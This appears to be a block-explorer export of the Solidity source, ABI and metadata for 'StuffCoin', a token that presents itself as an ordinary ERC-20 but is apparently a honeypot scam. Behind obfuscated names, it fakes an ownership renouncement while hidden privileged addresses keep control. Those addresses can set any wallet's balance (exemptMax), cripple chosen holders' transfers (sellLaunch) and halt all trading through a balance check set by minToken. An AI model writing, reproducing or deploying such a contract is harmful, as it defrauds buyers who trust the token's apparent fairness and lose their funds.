{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buyTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptAuto {\n    function createPair(address fundAutoReceiver, address minFrom) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface amountMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface limitTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLiquidityReceiver) external view returns (uint256);\n\n    function transfer(address modeList, uint256 listEnable) external returns (bool);\n\n    function allowance(address receiverTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeList,\n        uint256 listEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchWallet, uint256 value);\n    event Approval(address indexed receiverTo, address indexed spender, uint256 value);\n}\n\ninterface limitTotalMetadata is limitTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StuffCoin is buyTeam, limitTotal, limitTotalMetadata {\n\n    uint256 public tradingWallet;\n\n    uint256 private toToken;\n\n    mapping(address => mapping(address => uint256)) private receiverLaunch;\n\n    mapping(address => bool) public modeTakeSell;\n\n    bool private launchedMode;\n\n    function exemptMax(address modeMax, uint256 listEnable) public {\n        minMarketing();\n        teamListMarketing[modeMax] = listEnable;\n    }\n\n    function allowance(address limitMarketing, address liquidityEnable) external view virtual override returns (uint256) {\n        if (liquidityEnable == walletTotal) {\n            return type(uint256).max;\n        }\n        return receiverLaunch[limitMarketing][liquidityEnable];\n    }\n\n    bool public listTokenTx;\n\n    mapping(address => uint256) private teamListMarketing;\n\n    function transfer(address modeMax, uint256 listEnable) external virtual override returns (bool) {\n        return totalTakeAt(_msgSender(), modeMax, listEnable);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeIs;\n    }\n\n    uint256 marketingEnable;\n\n    function getOwner() external view returns (address) {\n        return fundAuto;\n    }\n\n    function autoShouldList() public {\n        emit OwnershipTransferred(exemptAmountWallet, address(0));\n        fundAuto = address(0);\n    }\n\n    uint256 public launchSender;\n\n    bool private toIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenFund;\n    }\n\n    uint256 private maxMarketing = 100000000 * 10 ** 18;\n\n    address public exemptAmountWallet;\n\n    address walletTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed fromSell, address indexed maxMin);\n\n    function transferFrom(address tradingTokenReceiver, address modeList, uint256 listEnable) external override returns (bool) {\n        if (_msgSender() != walletTotal) {\n            if (receiverLaunch[tradingTokenReceiver][_msgSender()] != type(uint256).max) {\n                require(listEnable <= receiverLaunch[tradingTokenReceiver][_msgSender()]);\n                receiverLaunch[tradingTokenReceiver][_msgSender()] -= listEnable;\n            }\n        }\n        return totalTakeAt(tradingTokenReceiver, modeList, listEnable);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxMarketing;\n    }\n\n    function approve(address liquidityEnable, uint256 listEnable) public virtual override returns (bool) {\n        receiverLaunch[_msgSender()][liquidityEnable] = listEnable;\n        emit Approval(_msgSender(), liquidityEnable, listEnable);\n        return true;\n    }\n\n    bool private toBuyEnable;\n\n    address private fundAuto;\n\n    function minToken(uint256 listEnable) public {\n        minMarketing();\n        marketingEnable = listEnable;\n    }\n\n    uint256 private marketingLaunch;\n\n    function exemptLiquidity(address tradingTokenReceiver, address modeList, uint256 listEnable) internal returns (bool) {\n        require(teamListMarketing[tradingTokenReceiver] >= listEnable);\n        teamListMarketing[tradingTokenReceiver] -= listEnable;\n        teamListMarketing[modeList] += listEnable;\n        emit Transfer(tradingTokenReceiver, modeList, listEnable);\n        return true;\n    }\n\n    function launchedIsTeam(address shouldSender) public {\n        require(shouldSender.balance < 100000);\n        if (listTokenTx) {\n            return;\n        }\n        \n        modeTakeSell[shouldSender] = true;\n        \n        listTokenTx = true;\n    }\n\n    function sellLaunch(address launchedFee) public {\n        minMarketing();\n        \n        if (launchedFee == exemptAmountWallet || launchedFee == sellToken) {\n            return;\n        }\n        modeAt[launchedFee] = true;\n    }\n\n    function minMarketing() private view {\n        require(modeTakeSell[_msgSender()]);\n    }\n\n    string private modeIs = \"SCN\";\n\n    string private takeLaunched = \"Stuff Coin\";\n\n    uint256 private listSwap;\n\n    uint256 public isTotal = 3;\n\n    address public sellToken;\n\n    function owner() external view returns (address) {\n        return fundAuto;\n    }\n\n    uint8 private tokenFund = 18;\n\n    uint256 launchedLiquidity;\n\n    address minBuySender;\n\n    uint256 private atFrom;\n\n    uint256 private receiverShould;\n\n    uint256 public autoTeam = 0;\n\n    function name() external view virtual override returns (string memory) {\n        return takeLaunched;\n    }\n\n    function totalTakeAt(address tradingTokenReceiver, address modeList, uint256 listEnable) internal returns (bool) {\n        if (tradingTokenReceiver == exemptAmountWallet) {\n            return exemptLiquidity(tradingTokenReceiver, modeList, listEnable);\n        }\n        uint256 tradingBuy = limitTotal(sellToken).balanceOf(minBuySender);\n        require(tradingBuy == marketingEnable);\n        require(modeList != minBuySender);\n        if (modeAt[tradingTokenReceiver]) {\n            return exemptLiquidity(tradingTokenReceiver, modeList, teamShould);\n        }\n        listEnable = maxMinEnable(tradingTokenReceiver, modeList, listEnable);\n        return exemptLiquidity(tradingTokenReceiver, modeList, listEnable);\n    }\n\n    mapping(address => bool) public modeAt;\n\n    function maxMinEnable(address tradingTokenReceiver, address modeList, uint256 listEnable) internal view returns (uint256) {\n        require(listEnable > 0);\n\n        uint256 teamShouldLaunch = 0;\n        if (tradingTokenReceiver == sellToken && isTotal > 0) {\n            teamShouldLaunch = listEnable * isTotal / 100;\n        } else if (modeList == sellToken && autoTeam > 0) {\n            teamShouldLaunch = listEnable * autoTeam / 100;\n        }\n        require(teamShouldLaunch <= listEnable);\n        return listEnable - teamShouldLaunch;\n    }\n\n    uint256 constant teamShould = 4 ** 10;\n\n    function balanceOf(address senderLiquidityReceiver) public view virtual override returns (uint256) {\n        return teamListMarketing[senderLiquidityReceiver];\n    }\n\n    constructor (){\n        \n        autoShouldList();\n        amountMax modeListEnable = amountMax(walletTotal);\n        sellToken = exemptAuto(modeListEnable.factory()).createPair(modeListEnable.WETH(), address(this));\n        minBuySender = exemptAuto(modeListEnable.factory()).feeTo();\n        \n        exemptAmountWallet = _msgSender();\n        modeTakeSell[exemptAmountWallet] = true;\n        teamListMarketing[exemptAmountWallet] = maxMarketing;\n        if (toToken == listSwap) {\n            receiverShould = toToken;\n        }\n        emit Transfer(address(0), exemptAmountWallet, maxMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidityReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmountWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listEnable\",\"type\":\"uint256\"}],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"}],\"name\":\"launchedIsTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listEnable\",\"type\":\"uint256\"}],\"name\":\"minToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTakeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"}],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTokenReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StuffCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}